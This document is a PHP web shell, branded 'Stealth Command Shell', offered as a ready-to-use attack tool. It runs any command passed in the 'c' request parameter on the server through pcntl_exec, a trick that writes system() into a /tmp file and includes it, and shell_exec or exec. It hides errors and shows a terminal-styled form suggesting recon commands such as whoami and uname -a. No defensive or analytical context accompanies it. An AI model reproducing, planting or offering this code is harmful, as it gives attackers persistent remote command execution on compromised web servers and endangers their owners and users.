<?php
error_reporting(0);

// ====================== PCNTL SHELL ======================
$cmd = $_GET['c'] ?? $_POST['c'] ?? '';

if (!empty($cmd)) {
    echo "<pre style='background:#000;color:#0f0;padding:15px;margin:0;'>";
    echo "Command: " . htmlspecialchars($cmd) . "\n";
    echo "Output:\n" . str_repeat("-", 60) . "\n";

    $output = "";

    // Method 1: pcntl_fork + pcntl_exec
    if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
        $pid = pcntl_fork();
        if ($pid == 0) {
            // Child process
            pcntl_exec("/bin/sh", ["-c", $cmd . " 2>&1"]);
            exit(0);
        } else if ($pid > 0) {
            sleep(1); // thoda wait
        }
    }

    // Method 2: Fallback methods
    if (empty($output)) {
        if (function_exists('error_log')) {
            $tmp = "/tmp/" . rand(1000,9999);
            error_log("<?php system('$cmd 2>&1'); ?>" , 3, $tmp);
            include($tmp);
            unlink($tmp);
        }
    }

    // Method 3: Direct try
    if (function_exists('shell_exec')) $output .= shell_exec($cmd . " 2>&1");
    elseif (function_exists('exec')) exec($cmd . " 2>&1", $arr); $output .= implode("\n", $arr??[]);

    echo htmlspecialchars($output ?: "No output or command executed in background.");
    echo "</pre>";
}
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Stealth Shell</title>
    <style>
        body { background:#0a0a0a; color:#0f0; font-family:Consolas, monospace; margin:0; padding:20px; }
        input { width:85%; padding:14px; background:#111; border:1px solid #0f0; color:#0f0; font-size:16px; }
        button { padding:14px 25px; background:#111; border:1px solid #0f0; color:#0f0; font-size:16px; cursor:pointer; }
        .header { background:#111; padding:15px; text-align:center; border-bottom:2px solid #0f0; }
    </style>
</head>
<body>
    <div class="header"><h2>🛠 Stealth Command Shell</h2></div>
    
    <form method="GET">
        <input type="text" name="c" placeholder="id || whoami || ls -la || uname -a" autofocus>
        <button type="submit">Run</button>
    </form>

    <small style="color:#555;">Example: ?c=id  or  ?c=ls -la</small>
</body>
</html>
